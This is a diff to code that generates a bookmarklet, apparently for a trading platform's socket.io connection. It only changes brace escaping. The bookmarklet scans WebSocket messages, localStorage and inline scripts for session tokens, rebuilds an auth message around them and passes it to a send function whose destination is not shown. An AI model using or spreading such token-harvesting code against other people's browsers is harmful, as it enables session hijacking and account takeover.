@@ -4591,13 +4591,13 @@ function _bookmarkletCode() {{
         'if(encontrado)return;' +
         'try{{' +
           'var s=typeof data==="string"?data:"";' +
-          // Mensagem de auth: 42["auth",{"session":"...","isDemo":...}]
+          // Mensagem de auth: 42["auth",{{"session":"...","isDemo":...}}]
           'if(s.indexOf(\'"session"\')>0&&s.indexOf("auth")>0){{' +
-            'var m=s.match(/"session"\\s*:\\s*"([^"]{20,})"/);' +
+            'var m=s.match(/"session"\\s*:\\s*"([^"]{{20,}})"/);' +
             'if(m){{' +
               'var isDemo=(s.indexOf(\'isDemo":1\')>0||s.indexOf(\'isDemo": 1\')>0)?1:0;' +
               'var uid=0;var mu=s.match(/"uid"\\s*:\\s*(\\d+)/);if(mu)uid=parseInt(mu[1]);' +
-              'var ssid=\'42["\'+\'auth\'+\'",{"\'+\'session\'+\'":"\'+m[1]+\'","isDemo\'+"\":"+isDemo+\',"uid":\'+uid+\',"platform":2}]\';' +
+              'var ssid=\'42["\'+\'auth\'+\'",{{\'+\'"session":"\'+m[1]+\'","isDemo\'+"\":"+isDemo+\',"uid":\'+uid+\',"platform":2}}]\';' +
               'enviar(ssid);' +
             '}}' +
           '}}' +
@@ -4613,11 +4613,11 @@ function _bookmarkletCode() {{
             'try{{' +
               'var s=typeof e.data==="string"?e.data:"";' +
               'if(s.indexOf(\'"session"\')>0){{' +
-                'var m=s.match(/"session"\\s*:\\s*"([^"]{20,})"/);' +
+                'var m=s.match(/"session"\\s*:\\s*"([^"]{{20,}})"/);' +
                 'if(m){{' +
                   'var isDemo=(s.indexOf(\'isDemo":1\')>0||s.indexOf(\'isDemo": 1\')>0)?1:0;' +
                   'var uid=0;var mu=s.match(/"uid"\\s*:\\s*(\\d+)/);if(mu)uid=parseInt(mu[1]);' +
-                  'var ssid=\'42["\'+\'auth\'+\'",{"\'+\'session\'+\'":"\'+m[1]+\'","isDemo\'+"\":"+isDemo+\',"uid":\'+uid+\',"platform":2}]\';' +
+                  'var ssid=\'42["\'+\'auth\'+\'",{{\'+\'"session":"\'+m[1]+\'","isDemo\'+"\":"+isDemo+\',"uid":\'+uid+\',"platform":2}}]\';' +
                   'enviar(ssid);' +
                 '}}' +
               '}}' +
@@ -4638,7 +4638,7 @@ function _bookmarkletCode() {{
           'var k=localStorage.key(i),v=localStorage.getItem(k)||"";' +
           'if(v.length>20&&(k==="session"||k==="token"||k==="io"||k==="ssid"||k==="auth")){{t=v;break;}}' +
           // Tenta JSON dentro do localStorage
-          'if(v[0]==="{{"||v[0]==="["){{' +
+          'if(v[0]==="{{" ||v[0]==="["){{' +
             'try{{var j=JSON.parse(v);' +
               'var s2=(j.session||j.token||j.ssid||j.auth||"");' +
               'if(s2&&s2.length>20){{t=s2;break;}}' +
@@ -4648,7 +4648,7 @@ function _bookmarkletCode() {{
       '}}catch(e){{}}' +
       // Monta o SSID se achou um token puro
       'if(t&&t.length>20&&t.indexOf("auth")<0){{' +
-        'var ssid=\'42["\'+\'auth\'+\'",{"\'+\'session\'+\'":"\'+t+\'","isDemo":1,"uid":0,"platform":2}]\';' +
+        'var ssid=\'42["\'+\'auth\'+\'",{{\'+\'"session":"\'+t+\'","isDemo":1,"uid":0,"platform":2}}]\';' +
         'enviar(ssid);' +
       '}} else if(t&&t.indexOf("auth")>0){{' +
         'enviar(t);' +
@@ -4661,9 +4661,9 @@ function _bookmarkletCode() {{
       'for(var i=0;i<scripts.length;i++){{' +
         'var txt=scripts[i].textContent;' +
         'if(txt&&txt.indexOf("session")>0){{' +
-          'var m=txt.match(/"session"\\s*:\\s*"([a-zA-Z0-9%_\\-\\.~]{20,})"/);' +
+          'var m=txt.match(/"session"\\s*:\\s*"([a-zA-Z0-9%_\\-\\.~]{{20,}})"/);' +
           'if(m){{' +
-            'var ssid=\'42["\'+\'auth\'+\'",{"\'+\'session\'+\'":"\'+m[1]+\'","isDemo":1,"uid":0,"platform":2}]\';' +
+            'var ssid=\'42["\'+\'auth\'+\'",{{\'+\'"session":"\'+m[1]+\'","isDemo":1,"uid":0,"platform":2}}]\';' +
             'enviar(ssid);break;' +
           '}}' +
         '}}' +
